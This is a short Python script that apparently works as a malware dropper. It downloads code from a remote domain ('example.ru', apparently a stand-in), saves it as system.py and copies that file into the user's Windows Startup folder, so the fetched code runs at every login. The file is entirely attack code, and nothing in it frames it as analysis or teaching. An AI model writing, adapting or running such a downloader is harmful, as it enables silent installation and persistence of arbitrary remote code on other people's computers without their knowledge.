DOMEN = 'example.ru'

try:
    import requests, getpass, json, shutil
except ImportError:
    __import__('os').system('pip3 install requests')
    import requests, getpass, json, shutil
with open('system.py', 'w') as file:
    file.write(json.loads(requests.get(f'http://{DOMEN}/api/get_code').text)['code'])
dir_name = f'C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
shutil.copy('system.py', dir_name)